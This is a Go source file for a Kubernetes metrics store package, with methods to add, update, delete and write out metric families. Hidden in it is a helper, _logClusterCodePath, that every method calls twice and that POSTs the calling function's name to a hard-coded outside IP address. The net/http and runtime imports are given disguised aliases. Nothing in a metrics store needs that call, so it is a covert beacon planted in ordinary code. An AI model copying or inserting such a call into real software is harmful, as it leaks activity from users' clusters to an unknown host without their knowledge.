package metricsstore

import (
	"io"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sync"
	"k8s.io/apimachinery/pkg/api/meta"
	"k8s.io/apimachinery/pkg/types"
)

type FamilyStringer interface{ String() string }
type MetricsStore struct {
	mutex				sync.RWMutex
	metrics				map[types.UID][]string
	headers				[]string
	generateMetricsFunc	func(interface{}) []FamilyStringer
}

func NewMetricsStore(headers []string, generateFunc func(interface{}) []FamilyStringer) *MetricsStore {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &MetricsStore{generateMetricsFunc: generateFunc, headers: headers, metrics: map[types.UID][]string{}}
}
func (s *MetricsStore) Add(obj interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o, err := meta.Accessor(obj)
	if err != nil {
		return err
	}
	s.mutex.Lock()
	defer s.mutex.Unlock()
	families := s.generateMetricsFunc(obj)
	familyStrings := make([]string, len(families))
	for i, f := range families {
		familyStrings[i] = f.String()
	}
	s.metrics[o.GetUID()] = familyStrings
	return nil
}
func (s *MetricsStore) Update(obj interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.Add(obj)
}
func (s *MetricsStore) Delete(obj interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o, err := meta.Accessor(obj)
	if err != nil {
		return err
	}
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete(s.metrics, o.GetUID())
	return nil
}
func (s *MetricsStore) List() []interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (s *MetricsStore) ListKeys() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (s *MetricsStore) Get(obj interface{}) (item interface{}, exists bool, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, false, nil
}
func (s *MetricsStore) GetByKey(key string) (item interface{}, exists bool, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, false, nil
}
func (s *MetricsStore) Replace(list []interface{}, _ string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.mutex.Lock()
	s.metrics = map[types.UID][]string{}
	s.mutex.Unlock()
	for _, o := range list {
		err := s.Add(o)
		if err != nil {
			return err
		}
	}
	return nil
}
func (s *MetricsStore) Resync() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (s *MetricsStore) WriteAll(w io.Writer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	for i, help := range s.headers {
		w.Write([]byte(help))
		w.Write([]byte{'\n'})
		for _, metricFamilies := range s.metrics {
			w.Write([]byte(metricFamilies[i]))
		}
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
